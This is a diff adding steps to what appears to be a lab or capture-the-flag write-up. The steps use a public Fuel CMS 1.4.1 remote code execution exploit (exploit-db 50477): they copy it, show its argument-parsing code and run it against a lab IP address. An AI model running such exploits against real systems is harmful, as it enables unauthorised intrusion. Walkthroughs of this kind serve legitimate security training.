@@ -98,5 +98,38 @@ Several options exist
 
 ![change file extension](assets/ignite-15.png)  
 
+Copy the chosen exploit to a chosen location, in this case the /tmp folder.  
+
+`:> cp /usr/share/exploitdb/exploits/php/webapps/50477.py /tmp/ignite/50477.py`  
+
+Examine the code. Instantiating the script requires a '-u' or '--url' parameter and requires that 'http' is present in the url parameter.  
+
+````python
+def get_arguments():
+        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[>
+
+        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')
+
+        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')
+
+        args = parser.parse_args()
+
+        if len(sys.argv) <=2:
+                parser.print_usage()
+                sys.exit()
+
+        return args
 
 
+args = get_arguments()
+url = args.url
+
+if "http" not in url:
+        sys.stderr.write("Enter vaild url")
+        sys.exit()
+
+````  
+
+## Initiate the Exploit  
+
+`:> pythohn3 50477.py -u http://10.201.126.242`
